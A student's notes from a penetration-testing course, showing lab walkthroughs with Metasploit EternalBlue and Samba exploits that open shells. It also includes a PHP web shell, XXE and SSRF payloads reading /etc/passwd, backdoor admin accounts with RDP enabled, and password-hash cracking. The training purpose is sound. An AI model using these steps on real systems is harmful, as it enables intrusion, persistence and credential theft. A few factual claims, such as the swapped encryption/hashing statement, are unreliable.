<!---DOC:Secarma Pentesting notes;Notes that I took while at the Secarma Hacker101 course;Sean Lewis-->
# Secarma Pentesting fun times

## Introduction

We'll be getting the slides after the 3 sessions.

## Day 1

### Basics

Laws:

* Incredibly vague to cover more ground
  - It is illegal to connect to someone's wifi, technically your connection is logged which is "unauthorized access to computer material."

KALI LINUX:

* Information security professionals platform of choice
* Debatable whether it is good or not?
* Built upon Debian Linux, real damn stable.
* Covering three tools:
  - Nmap - networks
  - Burpsuite - web applications
  - Metasploit - a lot, for now servers

Burpsuite:

* Java based
* Can be done manually or automatically
* Used to enumerate, scan and attack web applications.

Transmission Control Protocol (TCP):

* Operates at level 4 OSI model
* Reliable for the transfer of data


User Datagram Protocol (UDP):

* Also operates at level 4 OSI model
* Connectionless - no guarantee that data will arrive at its destination
* Often used for VOIP

Common ports:

* 80: HTTP
* 443: HTTPS
* 21: FTP (but technically the connection part of it?)

OSI model:

* 7) Application
* 6) Presentation
* 5) Session
* 4) Transport
* 3) Network
* 2) Data Link
* 1) Physical

NMAP:

* Free and open source
* Used to determine what hosts are on a network, what services they run and what ports are open.
* Some command line switches:
  - -v Verbose.
  - -p- Scans all 66535 TCP ports.
  - -sC Performs a script scan using a default set of scripts from the nmap scripting engine (NSE).
  - -sV Performs a version scan of the open ports that nmap discovers.
  - -oA
* NMAP scripting engine
  - Allows users to write and share simple scripts to automate a wide variety of networking tasks.
  - We can gather more sophisticated version detection, vulnerability detection and in some cases we can even use them for vulnerability exploitation.
  - Has the extension `'.nse'` located at `/usr/share/nmap/scripts` in KALI.

```bash
# Example commands!

# Scan range 0/24 all ports including 0
nmap -p- 10.0.6.0/24

# Scan range 0/24 all ports excluding 0
nmap -p0- 10.0.6.0/24
```

### NMAP Exploit!

First, I needed to gather some information on the target system. For me, the IP address was `10.0.6.46`.

```bash
nmap -Pn -sTV -A 10.0.6.46
```

This returned the specific version of Windows, so literally appending "exploit" to the version it gave `Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)`.

This lead to this link: https://www.exploit-db.com/exploits/42315/

I took the name of the exploit, and searched for it with metasploit: _"metasploit eternalblue"_. This gave instructions for using metasploit! https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue.

I ran `msfconsole` to open Metasploit. The website that had instructions gave the correct explit to load:

```bash
use exploit/windows/smb/ms17_010_eternalblue
```

This will set up the exploit. From here you can view the options:

```bash
show options
```

It will list all of the options, their current values and whether they are required for the exploit. One required option will be missing, `RHOST`. Set this to the target server with the following command:

```bash
set RHOST 10.0.6.46
```

Now we will need to select the payload. The exploit will get us access to the system, but we will need to execute something while we are there. You can view all of the available payloads for the exploit using:

```bash
show payloads
```

I wanted access to a command shell, so I used the following command to select it:

```bash
set payload generic/shell_bind_tcp
```

If this exploit supported checking, we could have ran a command that would have checked if it would be successful. The command would have been:

```bash
check
```

If it is attempted with the current exploit and payload, it will just display `This module does not support check`.

To execute the exploit, you can run either of these two commands:

* The normal, less to type way `run`
* The cooler sounding way `exploit`

There will be a lot of output, but if it was successful typing `dir` and pressing enter should display the directory on the Windows machine. There you have it, you are officially a `H A C K E R  M A N`.

### Web 101

Forced browsing:

* Some good options:
  - Dirbuster: not too great
    - Available on Kali.
    - Wordlist location in kali is `/usr/share/wordlists`.

Don't leak info:

* A default 404 page can leak information on what the system is
* Bad error messages can leak database schema/SQL version

XSS:

* Three types:
  * Reflected XSS
    - URL
  * Stored XSS
    - Hits everybody
  * DOM XSS
*  Modern browsers will strip bad JavaScript, prevent XSS.
  - This will not help older browsers/systems.
* Initial testing to see if XSS works:

```html
<script>alert(1)</script>
```

SQL Injection:

* One of the oldest and most prevalent vulnerabilities.
* It impacts:
  - Confidentiality
  - Integrity
  - Availability


## Day 2

### Web 202

Some common flaws:

* Misconfiguration
  - Web servers and web applications are complex - inexperienced admins could miss a setting which may open an avenue of an attack.
  - Experienced admins may cut corners or make incorrect judgement due to their inherent familarity with these servers.
  - Segregation - ensure that there is separation between the actual domain controller and subsequent IIS services.
* Input validation
  - A mechanism that is used to verify information that is entered into an application.
  - Nearly all modern-day web applications have some sort of need for input validation.
* Error messages
  - Overly verbose error messages.
  - Reveals a lot of information about both the server and the application, can be used to find exploits.

Transport Layer Socket (TLS) / Secure Socket Layer (SSL)

* TLS required to send data in an encrypted data.
* Allows us to send traffic over HTTPS rather than just HTTP.
* TLS makes use of one or more cipher suites.
  - ROT13: The worst one, rotate the letters 13 characters over.
* Cipher Suite contains a combination of authentication, encryption and message authentication code algorithms.
* Most of the common configuration mistakes when implementing TLS lie in the choice of cipher suites. They could use old and outdated ones.

Here is an example of a run of **sslscan** which provides information on a server's TLS support.

```bash
root@kali:~# sslscan https://google.com
Version: 1.11.12-static
OpenSSL 1.0.2-chacha (1.0.2g-dev)

Connected to 216.58.198.174

Testing SSL server google.com on port 443 using SNI name google.com

  TLS Fallback SCSV:
Server supports TLS Fallback SCSV

  TLS renegotiation:
Secure session renegotiation supported

  TLS Compression:
Compression disabled

  Heartbleed:
TLS 1.2 not vulnerable to heartbleed
TLS 1.1 not vulnerable to heartbleed
TLS 1.0 not vulnerable to heartbleed

  Supported Server Cipher(s):
Preferred TLSv1.2  128 bits  ECDHE-RSA-AES128-GCM-SHA256   Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-GCM-SHA384   Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.2  128 bits  AES128-GCM-SHA256            
Accepted  TLSv1.2  256 bits  AES256-GCM-SHA384            
Accepted  TLSv1.2  128 bits  AES128-SHA                   
Accepted  TLSv1.2  256 bits  AES256-SHA                   
Accepted  TLSv1.2  112 bits  DES-CBC3-SHA                 
Preferred TLSv1.1  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.1  128 bits  AES128-SHA                   
Accepted  TLSv1.1  256 bits  AES256-SHA                   
Accepted  TLSv1.1  112 bits  DES-CBC3-SHA                 
Preferred TLSv1.0  128 bits  ECDHE-RSA-AES128-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  256 bits  ECDHE-RSA-AES256-SHA          Curve P-256 DHE 256
Accepted  TLSv1.0  128 bits  AES128-SHA                   
Accepted  TLSv1.0  256 bits  AES256-SHA                   
Accepted  TLSv1.0  112 bits  DES-CBC3-SHA                 

  SSL Certificate:
Signature Algorithm: sha256WithRSAEncryption
RSA Key Strength:    2048

Subject:  *.google.com
Altnames: DNS:*.google.com, DNS:*.android.com, DNS:*.appengine.google.com, DNS:*.cloud.google.com, DNS:*.g.co, DNS:*.gcp.gvt2.com, DNS:*.ggpht.cn, DNS:*.google-analytics.com, DNS:*.google.ca, DNS:*.google.cl, DNS:*.google.co.in, DNS:*.google.co.jp, DNS:*.google.co.uk, DNS:*.google.com.ar, DNS:*.google.com.au, DNS:*.google.com.br, DNS:*.google.com.co, DNS:*.google.com.mx, DNS:*.google.com.tr, DNS:*.google.com.vn, DNS:*.google.de, DNS:*.google.es, DNS:*.google.fr, DNS:*.google.hu, DNS:*.google.it, DNS:*.google.nl, DNS:*.google.pl, DNS:*.google.pt, DNS:*.googleadapis.com, DNS:*.googleapis.cn, DNS:*.googlecommerce.com, DNS:*.googlevideo.com, DNS:*.gstatic.cn, DNS:*.gstatic.com, DNS:*.gstaticcnapps.cn, DNS:*.gvt1.com, DNS:*.gvt2.com, DNS:*.metric.gstatic.com, DNS:*.urchin.com, DNS:*.url.google.com, DNS:*.youtube-nocookie.com, DNS:*.youtube.com, DNS:*.youtubeeducation.com, DNS:*.youtubekids.com, DNS:*.yt.be, DNS:*.ytimg.com, DNS:android.clients.google.com, DNS:android.com, DNS:developer.android.google.cn, DNS:developers.android.google.cn, DNS:g.co, DNS:ggpht.cn, DNS:goo.gl, DNS:google-analytics.com, DNS:google.com, DNS:googlecommerce.com, DNS:source.android.google.cn, DNS:urchin.com, DNS:www.goo.gl, DNS:youtu.be, DNS:youtube.com, DNS:youtubeeducation.com, DNS:youtubekids.com, DNS:yt.be
Issuer:   Google Internet Authority G3

Not valid before: Oct 30 13:15:05 2018 GMT
Not valid after:  Jan 22 13:15:00 2019 GMT
```

> Encryption is a one-way function, hashing is a two-way function. They are not the same.

### Web 303

#### Unrestricted file upload

The upload functionality exposes a vulnerability which an attacker can exploit, by uploading a malicious script, an attacker can gain access/see resources etc. One potential attack would be uploading a web shell php script. You can find some pretty neat ones [here](https://github.com/JohnTroony/php-webshells). An example would be:

```php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

In the example given, we were allowed to upload a photo. We trapped the POST request with `burpsuite`, edited the script's content type (mime type) to `image/png` then forwarded it. Accessing the post we made and copying the image location, we could run commands like so `http://10.0.10.55/empbulletin/storage/bed89a4de13a3c70ba6ae128912b6679.php?cmd=cat+/etc/passwd`. This gave us the password file.

#### Server Side Request Forgery SSRF

In computer security, server-side request forgery is a type of exploit where an attacker abuses the functionality of a server causing it to access or manipulate information in the realm of that server that would otherwise not be directly accessible to the attacker. 

We were also able to change the POST to set the image url to `file:///etc/passwd` which retrieved the password file instead. Copying the image location in the final message and navigating to it will lead to that file.

#### XML External Entity (XXE)

A type of attack against an application that parses XML input. Some parsers don't sanitize input properly, allowing attackers to send a command. Some example XML can be found [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection).

For this application, if we can create our own XML entity and include it in the existent XML we should be able to get the XML parser to read our request.

During the POST, I changed the `XML` from `<request><id>19</id></request>` to

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
 <!DOCTYPE request [  
  <!ELEMENT request ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]><request><id>19&xxe;</id></request>
```

This rendered the `/etc/passwd` file.

## Day 3

We are going through some example ways of gaining access to some machines.


### Linux

```bash
root@kali:~# msfconsole 
                                                  

MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMM                MMMMMMMMMM
MMMN$                           vMMMM
MMMNl  MMMMM             MMMMM  JMMMM
MMMNl  MMMMMMMN       NMMMMMMM  JMMMM
MMMNl  MMMMMMMMMNmmmNMMMMMMMMM  JMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMMMMMMMMMMMMMMMMMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMMM   MMMMMMM   MMMMM  jMMMM
MMMNI  MMMNM   MMMMMMM   MMMMM  jMMMM
MMMNI  WMMMM   MMMMMMM   MMMM#  JMMMM
MMMMR  ?MMNM             MMMMM .dMMMM
MMMMNm `?MMM             MMMM` dMMMMM
MMMMMMN  ?MM             MM?  NMMMMMN
MMMMMMMMNe                 JMMMMMNMMM
MMMMMMMMMMNm,            eMMMMMNMMNMM
MMMMNNMNMMMMMNx        MMMMMMNMMNMMNM
MMMMMMMMNMMNMMMMm+..+MMNMMNMNMMNMMNMM
        https://metasploit.com


       =[ metasploit v4.17.25-dev                         ]
+ -- --=[ 1828 exploits - 1030 auxiliary - 318 post       ]
+ -- --=[ 541 payloads - 44 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > use auxiliary/scanner/smb/smb_version 
msf auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS                      yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(scanner/smb/smb_version) > set RHOSTS 10.0.3.28
RHOSTS => 10.0.3.28
msf auxiliary(scanner/smb/smb_version) > options

Module options (auxiliary/scanner/smb/smb_version):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   RHOSTS     10.0.3.28        yes       The target address range or CIDR identifier
   SMBDomain  .                no        The Windows domain to use for authentication
   SMBPass                     no        The password for the specified username
   SMBUser                     no        The username to authenticate as
   THREADS    1                yes       The number of concurrent threads

msf auxiliary(scanner/smb/smb_version) > execute

[*] 10.0.3.28:445         - Host could not be identified: Unix (Samba 3.6.25)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

msf auxiliary(scanner/smb/smb_version) > searchsploit samba 3.6.
[*] exec: searchsploit samba 3.6.

---------------------------------------------------------------------------- ----------------------------------------
 Exploit Title                                                              |  Path
                                                                            | (/usr/share/exploitdb/)
---------------------------------------------------------------------------- ----------------------------------------
Samba 3.4.16/3.5.14/3.6.4 - SetInformationPolicy AuditEventsInfo Heap Overf | exploits/linux/remote/21850.rb
Samba 3.5.11/3.6.3 - Remote Code Execution                                  | exploits/linux/remote/37834.py
Samba 3.5.22/3.6.17/4.0.8 - nttrans Reply Integer Overflow                  | exploits/linux/dos/27778.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                               | exploits/linux_x86/dos/36741.py
---------------------------------------------------------------------------- ----------------------------------------
Shellcodes: No Result

msf auxiliary(scanner/smb/smb_version) > use exploit/linux/samba/is_known_pipename
msf exploit(linux/samba/is_known_pipename) > show targets

Exploit targets:

   Id  Name
   --  ----
   0   Automatic (Interact)
   1   Automatic (Command)
   2   Linux x86
   3   Linux x86_64
   4   Linux ARM (LE)
   5   Linux ARM64
   6   Linux MIPS
   7   Linux MIPSLE
   8   Linux MIPS64
   9   Linux MIPS64LE
   10  Linux PPC
   11  Linux PPC64
   12  Linux PPC64 (LE)
   13  Linux SPARC
   14  Linux SPARC64
   15  Linux s390x


msf exploit(linux/samba/is_known_pipename) > options

Module options (exploit/linux/samba/is_known_pipename):

   Name            Current Setting  Required  Description
   ----            ---------------  --------  -----------
   RHOST                            yes       The target address
   RPORT           445              yes       The SMB service port (TCP)
   SMB_FOLDER                       no        The directory to use within the writeable SMB share
   SMB_SHARE_NAME                   no        The name of the SMB share containing a writeable directory


Exploit target:

   Id  Name
   --  ----
   0   Automatic (Interact)


msf exploit(linux/samba/is_known_pipename) > set RHOST 10.0.3.28
RHOST => 10.0.3.28
msf exploit(linux/samba/is_known_pipename) > exploit

[*] 10.0.3.28:445 - Using location \\10.0.3.28\confidential\ for the path
[*] 10.0.3.28:445 - Retrieving the remote path of the share 'confidential'
[*] 10.0.3.28:445 - Share 'confidential' has server-side path '/home/custard/confidential
[*] 10.0.3.28:445 - Uploaded payload to \\10.0.3.28\confidential\ikBDgapY.so
[*] 10.0.3.28:445 - Loading the payload from server-side path /home/custard/confidential/ikBDgapY.so using \\PIPE\/home/custard/confidential/ikBDgapY.so...
[+] 10.0.3.28:445 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (192.168.10.50:38491 -> 10.0.3.28:445) at 2018-11-28 15:18:58 -0500

ls
_cafenv-appconfig_
vmware-root
```

Time to create a user!

```bash
adduser sean
Adding user `sean' ...
Adding new group `sean' (1002) ...
Adding new user `sean' (1002) with group `sean' ...
Creating home directory `/home/sean' ...
Copying files from `/etc/skel' ...

Enter new UNIX password: test
Retype new UNIX password: test
passwd: password updated successfully

usermod -aG sudo sean
```

Now we can `ssh` into the server:

```bash
root@kali:~# ssh sean@10.0.3.28
sean@10.0.3.28's password: 
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/
New release '14.04.5 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

sean@Transylvania:~$ exit
logout
Connection to 10.0.3.28 closed.
```

We can now acquire the password hashes, which are located `/etc/shadow`. Copying this file into `kali`, we can try cracking these hashes.

```bash
root@kali:~# john
Created directory: /root/.john
John the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx]
Copyright (c) 1996-2015 by Solar Designer and others
Homepage: http://www.openwall.com/john/

Usage: john [OPTIONS] [PASSWORD-FILES]
--single[=SECTION]        "single crack" mode
--wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin
                  --pipe  like --stdin, but bulk reads, and allows rules
--loopback[=FILE]         like --wordlist, but fetch words from a .pot file
--dupe-suppression        suppress all dupes in wordlist (and force preload)
--prince[=FILE]           PRINCE mode, read words from FILE
--encoding=NAME           input encoding (eg. UTF-8, ISO-8859-1). See also
                          doc/ENCODING and --list=hidden-options.
--rules[=SECTION]         enable word mangling rules for wordlist modes
--incremental[=MODE]      "incremental" mode [using section MODE]
--mask=MASK               mask mode using MASK
--markov[=OPTIONS]        "Markov" mode (see doc/MARKOV)
--external=MODE           external mode or word filter
--stdout[=LENGTH]         just output candidate passwords [cut at LENGTH]
--restore[=NAME]          restore an interrupted session [called NAME]
--session=NAME            give a new session the NAME
--status[=NAME]           print status of a session [called NAME]
--make-charset=FILE       make a charset file. It will be overwritten
--show[=LEFT]             show cracked passwords [if =LEFT, then uncracked]
--test[=TIME]             run tests and benchmarks for TIME seconds each
--users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only
--groups=[-]GID[,..]      load users [not] of this (these) group(s) only
--shells=[-]SHELL[,..]    load users with[out] this (these) shell(s) only
--salts=[-]COUNT[:MAX]    load salts with[out] COUNT [to MAX] hashes
--save-memory=LEVEL       enable memory saving, at LEVEL 1..3
--node=MIN[-MAX]/TOTAL    this node's number range out of TOTAL count
--fork=N                  fork N processes
--pot=NAME                pot file to use
--list=WHAT               list capabilities, see --list=help or doc/OPTIONS
--format=NAME             force hash of type NAME. The supported formats can
                          be seen with --list=formats and --list=subformats
                
root@kali:~# john hash.txt 
Warning: detected hash type "sha512crypt", but the string is also recognized as "crypt"
Use the "--format=crypt" option to force loading these as that type instead
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:05 55.91% 1/3 (ETA: 15:37:54) 0g/s 713.5p/s 713.5c/s 713.5C/s S9999910..Sean13
0g 0:00:00:12 0.11% 2/3 (ETA: 18:39:25) 0g/s 709.1p/s 719.3c/s 719.3C/s helpme..john
test             (sean)
1g 0:00:00:24 3.91% 2/3 (ETA: 15:47:59) 0.04074g/s 535.6p/s 726.0c/s 726.0C/s Shoes..Alice1
1g 0:00:00:36 6.36% 2/3 (ETA: 15:47:11) 0.02738g/s 480.8p/s 729.7c/s 729.7C/s novembers..sweets
1g 0:00:01:07 13.60% 2/3 (ETA: 15:45:59) 0.01472g/s 428.2p/s 731.7c/s 731.7C/s ardnassac..lufetarg
Use the "--show" option to display all of the cracked passwords reliably
Session aborted
root@kali:~# john hash.txt --show
sean:test:17863:0:99999:7:::

1 password hash cracked, 3 left
root@kali:~# gunzip /usr/share/wordlists/rockyou.txt.gz             
root@kali:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 3 password hashes with 3 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Remaining 2 password hashes with 2 different salts
Press 'q' or Ctrl-C to abort, almost any other key for status
teapot           (custard)
coffeecup        (root)
2g 0:00:02:00 DONE (2018-11-28 15:42) 0.01665g/s 636.2p/s 733.7c/s 733.7C/s dannapaola..coffeecup
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

### Windows Box

This is an extended walkthrough of the `eternalblue` exploit, expanded to include gaining more permanent access.

```bash
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOST                           yes       The target address
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf exploit(windows/smb/ms17_010_eternalblue) > set RHOST 10.0.3.27
RHOST => 10.0.3.27
msf exploit(windows/smb/ms17_010_eternalblue) > options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOST          10.0.3.27        yes       The target address
   RPORT          445              yes       The target port (TCP)
   SMBDomain      .                no        (Optional) The Windows domain to use for authentication
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Exploit target:

   Id  Name
   --  ----
   0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf exploit(windows/smb/ms17_010_eternalblue) > set payload generic/shell_bind_tcp
payload => generic/shell_bind_tcp
msf exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] 10.0.3.27:445 - Connecting to target for exploitation.
[+] 10.0.3.27:445 - Connection established for exploitation.
[+] 10.0.3.27:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.3.27:445 - CORE raw buffer dump (42 bytes)
[*] 10.0.3.27:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 10.0.3.27:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 10.0.3.27:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 10.0.3.27:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.3.27:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.3.27:445 - Sending all but last fragment of exploit packet
[*] 10.0.3.27:445 - Starting non-paged pool grooming
[+] 10.0.3.27:445 - Sending SMBv2 buffers
[+] 10.0.3.27:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.3.27:445 - Sending final SMBv2 buffers.
[*] 10.0.3.27:445 - Sending last fragment of exploit packet!
[*] 10.0.3.27:445 - Receiving response from exploit packet
[+] 10.0.3.27:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.3.27:445 - Sending egg to corrupted connection.
[*] 10.0.3.27:445 - Triggering free of corrupted buffer.
[*] Started bind TCP handler against 10.0.3.27:4444
[*] Command shell session 1 opened (192.168.10.50:40507 -> 10.0.3.27:4444) at 2018-11-28 14:22:20 -0500
[+] 10.0.3.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.3.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.3.27:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```

We will now have access to a shell. I will be testing this by writing and then reading a file.

```bash

C:\Windows\system32>echo "GENERAL KENOBI" > Hello_there
echo "GENERAL KENOBI" > Hello_there

C:\Windows\system32>type Hello_there
type Hello_there
"GENERAL KENOBI" 

```

Although this gives us a lot of access, it is only temporary. This could be patched out with an update so more permanent access is needed. This will be done by creating a brand new user and giving them a high level of permission.

```bash

C:\Windows\system32>net user /add sean testing123!
net user /add sean testing123!
The command completed successfully.

C:\Windows\system32>net localgroup administrators sean /add
net localgroup administrators sean /add
The command completed successfully.


C:\Windows\system32>reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
The operation completed successfully.

C:\Windows\system32>
```

Now we have a permanent account on the system, with administrator permission levels AND we enabled Remote Desktop. Now we can access the Windows box using RDP:

```bash
root@kali:~# rdesktop -u sean 10.0.3.27
Autoselected keyboard map en-us
ERROR: CredSSP: Initialize failed, do you have correct kerberos tgt initialized ?
Connection established using SSL.
WARNING: Remote desktop does not support colour depth 24; falling back to 16
```

![RDP Result](./images/notes/rdp.png)


## Further reading

* [Everyday Cryptography: Fundamental Principles & Applications](https://www.amazon.co.uk/Everyday-Cryptography-Fundamental-Principles-Applications/dp/0199695598/ref=sr_1_2?ie=UTF8&qid=1542826701&sr=8-2&keywords=everyday+cryptography)
* [Useful NMAP commands](https://hackertarget.com/nmap-cheatsheet-a-quick-reference-guide/)